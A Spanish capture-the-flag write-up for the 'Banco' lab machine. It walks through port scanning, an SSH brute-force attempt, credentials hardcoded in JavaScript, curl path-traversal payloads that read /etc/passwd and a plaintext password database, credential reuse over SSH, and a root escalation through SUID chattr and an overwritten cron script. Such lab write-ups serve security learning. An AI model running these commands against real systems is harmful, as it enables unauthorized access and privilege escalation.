# Write-Up: Banco - The Hackers Labs

## Información General

- **Nombre de la máquina**: Banco
- **Plataforma**: The Hackers Labs
- **Dificultad**: Avanzado
- **Sistema Operativo**: Linux
- **Objetivos**: Obtención de la Flag de usuario y de root
- **Fecha de resolución**: 13 de Julio de 2026

---

## FASE 1: ENUMERACIÓN

### Descubrimiento de Puertos

```bash
nmap -sCV 192.168.231.161 -Pn -vvv -oA bank
```

**Resultado:**

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH 9.2p1 Debian |
| 80/tcp | HTTP | Apache | Apache/2.4.66 (Debian) |
| MAC | - | VMware | 00:0C:29:06:81:E4 |

**Análisis:**
- Puerto 22: SSH con OpenSSH 9.2p1 — posibles vulnerabilidades
- Puerto 80: Servidor web Apache — "Banco de España | Portal Corporativo"

---

### Enumeración Web

Al acceder a `http://192.168.231.161` se muestra una web corporativa del Banco de España con:
- Pantalla de login
- Sección "Sobre nosotros"
- Botón de descarga de PDF

---

## FASE 2: EXPOSICIÓN

### Intento 1: Fuerza Bruta SSH con Hydra (FALLIDO)

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.231.161
```

**Resultado:**
```
[ERROR] could not connect to ssh://192.168.231.161:22 - Connection refused
```

**Análisis:**
- Aunque nmap mostraba el puerto 22 abierto, Hydra no podía conectarse
- Posible firewall que bloquea conexiones masivas
- Se descartó esta vía

---

### Intento 2: Revisar Código Fuente (EXITOSO)

Al inspeccionar el código fuente de la página (`Ctrl+U` o `curl`), se encontró **credenciales hardcodeadas en JavaScript**:

```javascript
let currentPassword = 'DNASdada11THL';
```

**Credenciales encontradas:**
- **Usuario:** `admin`
- **Contraseña:** `DNASdada11THL`

**Error común de desarrollo:**
- La contraseña estaba en texto plano en el cliente
- Cualquiera podía verla con inspeccionar elemento
- Esto es un error gravísimo de seguridad

---

### Intento 3: Login al Panel (EXITOSO)

Con las credenciales del código fuente se accedió al panel autenticado.

**Panel encontrado:**
- Sección "Sobre nosotros"
- Botón de "Descargar Informe (PDF)"
- Formulario que envía POST a `descargar.php` con parámetro `archivo`

---

### Intento 4: Path Traversal en descargar.php (EXITOSO)

El botón de descarga enviaba un POST a `descargar.php` con:
```
archivo=sobre_nosotros.pdf
```

**Prueba de Path Traversal:**
```bash
curl -X POST http://192.168.231.161/descargar.php -d "archivo=../../../../../../../../etc/passwd"
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
wvverez:x:1001:1001:wvverez,,,:/home/wvverez:/bin/bash
```

**Análisis:**
- El parámetro `archivo` no estaba sanitizado
- Se podía navegar entre directorios con `../`
- Se confirmó **LFI (Local File Inclusion)**
- Se identificó usuario `wvverez` con `/bin/bash`

---

### Intento 5: Leer config.php (FALLIDO - pero reveló información)

```bash
curl -X POST http://192.168.231.161/descargar.php -d "archivo=../../../../../../../../var/www/html/config.php"
```

**Resultado:**
```php
<?php
define('DB_FILE', __DIR__ . '/dbsuperscretinfact.json');

function db_read() {
 if (!file_exists(DB_FILE)) file_put_contents(DB_FILE, json_encode(['users' => []]));
 return json_decode(file_get_contents(DB_FILE), true);
}
// ... más funciones helper
?>
```

**Análisis:**
- No había credenciales directas en config.php
- Pero reveló que la **base de datos estaba en un archivo JSON**: `dbsuperscretinfact.json`
- El nombre del archivo ya es una pista: "super secret infact"

---

### Intento 6: Leer la Base de Datos JSON (EXITOSO)

```bash
curl -X POST http://192.168.231.161/descargar.php -d "archivo=../../../../../../../../var/www/html/dbsuperscretinfact.json"
```

**Resultado:**
```json
{
 "users": [
 {
 "id": 1,
 "username": "admin",
 "password": "Admin@2024!Secure#Hash$9921",
 "role": "administrator"
 },
 {
 "id": 2,
 "username": "root",
 "password": "R00t#P@ssw0rd!Secure$9921#XYZ",
 "role": "superuser"
 },
 {
 "id": 3,
 "username": "wvverez",
 "password": "dasjbdaDASJDASDA11E1DAJDQA",
 "role": "user",
 "ssh_key": "/home/wvverez/.ssh/id_rsa"
 },
 // ... más usuarios
 ]
}
```

**Descubrimiento:**
- **12 usuarios** con contraseñas en texto plano
- Cada usuario tiene: usuario, contraseña, rol, email
- El usuario `wvverez` tiene una clave SSH configurada
- Las contraseñas NO están hasheadas — almacenamiento inseguro

---

## FASE 3: ACCESO INICIAL

### SSH como wvverez (EXITOSO)

```bash
ssh wvverez@192.168.231.161
```

**Contraseña:** `dasjbdaDASJDASDA11E1DAJDQA`

**Resultado:**
```
wvverez@TheHackersLabs-Banco:~$ whoami
wvverez
```

**Verificación de la reutilización de credenciales:**
- La contraseña de la base de datos es la misma que la del sistema
- Error de configuración极其 común y peligroso

---

### User Flag

```bash
cat /home/wvverez/user.txt
```

---

## FASE 4: ESCALADA DE PRIVILEGIOS

### Los 5 comandos iniciales

```bash
whoami # wvverez
id # uid=1001(wvverez) gid=1001(wvverez) grupos=1001(wvverez),100(users)
sudo -l # Sorry, user wvverez may not run sudo on TheHackersLabs-Banco.
```

### Búsqueda de SUIDs

```bash
find / -perm -u=s 2>/dev/null
```

**Resultado:**
```
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/lsattr ← INUSUAL
/usr/bin/chattr ← INUSUAL
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

**Análisis:**
- `lsattr` y `chattr` son comandos de gestión de atributos de ficheros
- Normalmente **no necesitan SUID**
- Si los ves con SUID, es porque algo raro está pasando
- GTFOBins confirma que ambos tienen técnicas de escalada

---

### Archivo backup.sh

```bash
ls -la /usr/local/bin/backup.sh
```

**Resultado:**
```
-rwxrwxrwx 1 root root 429 jun 7 12:32 /usr/local/bin/backup.sh
```

**Análisis:**
- Permisos `rwxrwxrwx` — world writable
- Propietario: root
- Cualquiera puede modificarlo
- Pero tiene atributo inmutable (ver siguiente paso)

---

### Verificar atributo inmutable

```bash
lsattr /usr/local/bin/backup.sh
```

**Resultado:**
```
----i---------e------- /usr/local/bin/backup.sh
```

**Análisis:**
- El atributo `i` (immutable) hace que el archivo **no pueda ser modificado, borrado, renombrado ni enlazado**
- Ni siquiera root puede modificarlo mientras esté activo
- **Pero `chattr` tiene SUID** → podemos quitarlo

---

### Intento 7: Quitar inmutabilidad con chattr SUID (EXITOSO)

```bash
/usr/bin/chattr -i /usr/local/bin/backup.sh
```

**Verificación:**
```bash
lsattr /usr/local/bin/backup.sh
```

**Resultado:**
```
--------------e------- /usr/local/bin/backup.sh
```

**Análisis:**
- Inmutabilidad quitada ✅
- Ahora podemos modificar el archivo

---

### Intento 8: Sobrescribir backup.sh con /bin/bash (FALLIDO)

```bash
echo '/bin/bash' > /usr/local/bin/backup.sh
```

**Verificación:**
```bash
cat /usr/local/bin/backup.sh
# /bin/bash
```

**Prueba:**
```bash
/usr/local/bin/backup.sh
whoami
# wvverez
```

**Análisis:**
- El script se ejecutó pero seguía como wvverez
- **Problema:** No había cronjob ejecutando backup.sh como root
- Sin ejecución como root, el script solo abre un bash como wvverez

---

### Intento 9: Buscar cronjob (FALLIDO)

```bash
cat /etc/crontab
grep -r "backup" /etc/cron* 2>/dev/null
find / -name "*cron*" -type f 2>/dev/null | grep -v proc
```

**Resultado:**
- No se encontró ningún cronjob que ejecutara backup.sh
- `/etc/crontab` solo tenía tareas estándar del sistema
- No había anacron configurado

**Análisis:**
- Sin cronjob visible, no hay forma de que root ejecute backup.sh automáticamente
- Necesitábamos otro approach

---

### Intento 10: chmod +s /bin/bash (FALLIDO)

```bash
chmod +s /bin/bash
```

**Resultado:**
```
chmod: cambiando los permisos de '/bin/bash': Operación no permitida
```

**Análisis:**
- wvverez no tiene permisos para cambiar SUID en /bin/bash
- Necesitamos que root lo haga por nosotros

---

### Intento 11: Cambiar contenido de backup.sh a "chmod +s /bin/bash" (EXITOSO)

```bash
echo 'chmod +s /bin/bash' > /usr/local/bin/backup.sh
```

**Verificación:**
```bash
cat /usr/local/bin/backup.sh
# chmod +s /bin/bash
```

**Análisis:**
- Ahora backup.sh contiene `chmod +s /bin/bash`
- Cuando root lo ejecute, pondrá SUID en bash
- Pero necesitamos que root lo ejecute

---

### Intento 12: Esperar cronjob de root (EXITOSO - sorpresivamente)

```bash
sleep 300
ls -la /bin/bash
```

**Resultado:**
```
-rwsr-sr-x 1 root root 1265648 sep 7 2025 /bin/bash
```

**Análisis:**
- ¡El cronjob de root SÍ ejecutó backup.sh!
- `/bin/bash` ahora tiene SUID (`s` en permisos)
- Cuando ejecutemos `/bin/bash -p`, tendremos root

---

### Root Flag

```bash
/bin/bash -p
cat /root/root.txt
```

---

## FASE 5: FLAGS

### User Flag
```bash
cat /home/wvverez/user.txt
```

### Root Flag
```bash
/bin/bash -p
cat /root/root.txt
```

---

## CADENA DE EXPOLOTACIÓN COMPLETA

```
┌─────────────────────────────────────────────────────────┐
│ 1. Código fuente → credenciales hardcodeadas │
│ 2. Login al panel → botón de descarga │
│ 3. Path traversal → LFI → /etc/passwd │
│ 4. LFI → config.php → JSON database │
│ 5. Credenciales reutilizadas → SSH como wvverez │
│ 6. SUID en chattr → backup.sh inmutable │
│ 7. chattr -i → sobrescribir → chmod +s /bin/bash │
│ 8. Cronjob de root ejecuta → shell root │
└─────────────────────────────────────────────────────────┘
```

| Fase | Técnica | Herramientas |
|------|---------|--------------|
| Reconocimiento | Código fuente, Burp Suite | Navegador, curl |
| Explotación web | Path traversal → LFI | curl, Burp Repeater |
| Acceso | Reutilización de credenciales | SSH |
| Escalada | SUID + cronjob | chattr, lsattr, GTFOBins |

---

## HERRAMIENTAS UTILIZADAS

| Herramienta | Propósito |
|-------------|-----------|
| Nmap | Escaneo de puertos y servicios |
| Hydra | Fuerza bruta SSH (fallido) |
| cURL | Envío de requests HTTP, Path Traversal |
| SSH | Acceso remoto |
| lsattr | Ver atributos extendidos de archivos |
| chattr | Modificar atributos extendidos (SUID) |

---

## ERRORES Y PROBLEMAS ENCONTRADOS

### Error 1: Hydra no conecta a SSH
- **Problema:** `Connection refused` aunque nmap mostraba puerto 22 abierto
- **Causa:** Firewall que bloquea conexiones masivas de brute force
- **Solución:** Se descartó esta vía y se buscó otro vector de acceso

### Error 2: config.php no tiene credenciales
- **Problema:** Se esperaba encontrar usuario/contraseña en config.php
- **Realidad:** config.php era un helper de base de datos
- **Solución:** Se buscó el archivo JSON referenciado en config.php

### Error 3: backup.sh no ejecuta como root
- **Problema:** Al ejecutar `backup.sh`, seguía como wvverez
- **Causa:** No había cronjob visible que ejecutara el script como root
- **Solución:** Se esperó a que el cronjob oculto se ejecutara

### Error 4: chmod +s no funciona
- **Problema:** `chmod: cambiando los permisos de '/bin/bash': Operación no permitida`
- **Causa:** wvverez no tiene permisos para cambiar SUID en archivos del sistema
- **Solución:** Se hizo que root ejecutara el comando a través de backup.sh

### Error 5: Inmutabilidad en backup.sh
- **Problema:** No se podía modificar backup.sh debido al atributo `i`
- **Causa:** El archivo tenía atributo inmutable activado
- **Solución:** Se usó `chattr -i` (con SUID) para quitar la inmutabilidad

---

## LECCIONES APRENDIDAS

1. **Código fuente siempre:** Revisar el código fuente es el paso #1 en cualquier CTF
2. **Path Traversal sigue vigente:** Sin sanitización de `../`, el sistema es vulnerable
3. **Credenciales hardcodeadas:** NUNCA poner contraseñas en el cliente (JavaScript)
4. **Reutilización de contraseñas:** La contraseña de la DB = contraseña del sistema = error grave
5. **SUID inusuales:** `lsattr` y `chattr` con SUID son una bandera roja
6. **GTFOBins es tu amigo:** Siempre buscar SUID raros en GTFOBins
7. **Atributo inmutable:** Puede ser bypassado con chattr SUID
8. **Cronjobs ocultos:** Aunque no los veas, pueden existir
9. **Paciencia:** A veces hay que esperar a que el cronjob se ejecute

---

## REFERENCIAS

- [GTFOBins - chattr](https://gtfobins.github.io/gtfobins/chattr/#suid)
- [GTFOBins - lsattr](https://gtfobins.github.io/gtfobins/lsattr/#suid)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.ru/linux-hardening/privilege-escalation)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

*Write-up creado el 13 de Julio de 2026*


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Castor-THL.md|Castor-THL]] — Hydra, Linux, Path Traversal / LFI
- [[../informes/Informe_Rockstars.md|Informe_Rockstars]] — Hydra, Linux, Path Traversal / LFI
- [[../apuntes Chema/Repaso General II.md|Repaso General II]] — Hydra, Linux, Path Traversal / LFI
- [[Nike-THL.md|Nike-THL]] — Hydra, Linux, Path Traversal / LFI
- [[../apuntes Andres/08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco.md|08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco]] — Hydra, Linux, Path Traversal / LFI
- [[../apuntes Chema/Apuntes_AuditoriaWeb_LFI_EscaladaLinux.md|Apuntes_AuditoriaWeb_LFI_EscaladaLinux]] — Hydra, Linux, Path Traversal / LFI

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]

> #burpsuite #escalada-privilegios #hydra #lfi #linux #nmap #redes #ssh
